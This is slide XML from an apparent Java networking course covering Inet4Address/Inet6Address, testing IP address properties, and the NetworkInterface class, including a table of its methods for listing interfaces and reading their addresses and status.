            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411692" y="2590800"/>
            <a:ext cx="11387667" cy="2667000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Verify IP characteristics: reachability (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>isReachable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>), scope (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>isSiteLocalAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>), and version (IPv4/IPv6).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can build network diagnostic tools (e.g., ping utilities).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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en-GB" altLang="zh-CN"/>
              <a:t>Inet4Address/Inet6Address</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43011" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="436033" y="1371600"/>
            <a:ext cx="11527367" cy="5345114"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>public final Inet4Address extends InetAddress</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>public final Inet6Address extends InetAddress</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>Generally not used, you can use the length of the array returned </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>by getAddress() to determine the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>address type</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4301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98700" y="3505201"/>
            <a:ext cx="6311900" cy="321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1676400" y="152400"/>
            <a:ext cx="8540750" cy="533400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Testing the nature of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>an IP address</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56323" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="685800"/>
            <a:ext cx="11811000" cy="1905000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Sometimes a program needs to test the properties of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>an IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>: 10 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>ways to test the properties of an address entered from the command line</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Demonstration sample code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>ch4.IPCharacteristics.java, ex4-6</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="56324"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57200" y="2057400"/>
            <a:ext cx="11277600" cy="4664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a:xfrm>
            <a:off x="1676400" y="152400"/>
            <a:ext cx="8540750" cy="533400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200"/>
              <a:t>Testing the nature of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200"/>
              <a:t>an IP address</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="3200"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="57347"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25550" y="990600"/>
            <a:ext cx="8991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xfrm>
            <a:off x="1524000" y="228600"/>
            <a:ext cx="8540750" cy="646331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>Testing the nature of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0"/>
              <a:t>an IP address</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="58371"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717109"/>
            <a:ext cx="11201400" cy="4903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文本框 3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="152400" y="1121162"/>
            <a:ext cx="10668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b="1" dirty="0"/>
              <a:t>Directly run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0"/>
              <a:t>the IPCharacteristics </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>class without parameters, and the console output is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800" b="1"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8. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NetworkInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Class</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="2019301"/>
            <a:ext cx="11387667" cy="3124200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enumerate network adapters and their bound IPs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Distinguish between active/inactive interfaces.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can programmatically list all network interfaces and their configurations.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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xfrm>
            <a:off x="402167" y="228600"/>
            <a:ext cx="11387667" cy="533400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0"/>
              <a:t>NetworkInterface</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59395" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304801" y="759977"/>
            <a:ext cx="11485033" cy="2440423"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>NetworkInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t> class in Java (from the java.net package) represents a network interface on a device, which can be a physical interface (e.g., Ethernet port, Wi-Fi adapter) or a virtual interface (e.g., VPN, loopback).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>It provides methods to access network configuration details, making it essential for applications that need to interact with multiple network interfaces or gather network information programmatically.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59396" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="9232900" y="6388100"/>
            <a:ext cx="14414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InterfaceList</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3288196"/>
            <a:ext cx="11180234" cy="3012107"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1370"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1030"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="20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Key Features of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="404040"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>NetworkInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000"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t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600"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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Enumerate Network Interfaces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"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br>
            <a:r>
              <a:rPr lang="en-US"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List all available network interfaces on the system.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="404040"/>
              </a:solidFill>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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Retrieve Interface Details</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"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br>
            <a:r>
              <a:rPr lang="en-US"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Get information like name, display name, IP addresses, MAC (hardware) address, and interface status.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="404040"/>
              </a:solidFill>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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Identify Interface Types</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"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br>
            <a:r>
              <a:rPr lang="en-US"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Check if an interface is a loopback interface, virtual interface, or supports multicast.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="404040"/>
              </a:solidFill>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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Bind Applications to Specific Interfaces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"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br>
            <a:r>
              <a:rPr lang="en-US"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Useful for servers or clients that need to bind to a particular network interface.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="404040"/>
              </a:solidFill>
              <a:effectLst/>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graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="3" name="Table 2"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="191924" y="130456"/>
          <a:ext cx="11085676" cy="6455086"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="4380076"/>
                <a:gridCol w="6705600"/>
              </a:tblGrid>
              <a:tr h="362836">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Method</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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r>
                        <a:rPr lang="en-US" sz="1600" b="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Description</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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745709">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>static Enumeration&lt;NetworkInterface&gt; getNetworkInterfaces()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Returns all network interfaces on the system.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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576970">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>static NetworkInterface getByName(String name)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Returns the network interface with the specified name (e.g., eth0, wlan0).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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745709">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>NetworkInterface</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getByInetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>addr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Returns the interface associated with a specific IP address.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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362836">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>String getName()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Returns the system name of the interface (e.g., eth0).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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576970">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>String getDisplayName()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Returns a human-readable name (e.g., Ethernet Adapter).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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576970">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Enumeration&lt;InetAddress&gt; getInetAddresses()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Returns all IP addresses (IPv4 and IPv6) assigned to the interface.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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576970">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>byte[] getHardwareAddress()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Returns the MAC address (as a byte array). Returns null if unavailable.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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362836">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean isUp()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Returns true if the interface is active and running.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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576970">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean isLoopback()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Checks if the interface is a loopback interface (e.g., 127.0.0.1).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641"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r h="576970">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean supportsMulticast()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="56296"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sz="1800" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Checks if the interface supports multicast communication.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="1" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="58641" marR="58641" marT="58641" marB="5864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0866" y="147637"/>
            <a:ext cx="11497733" cy="728663"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example: List the network interfaces on this machine</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
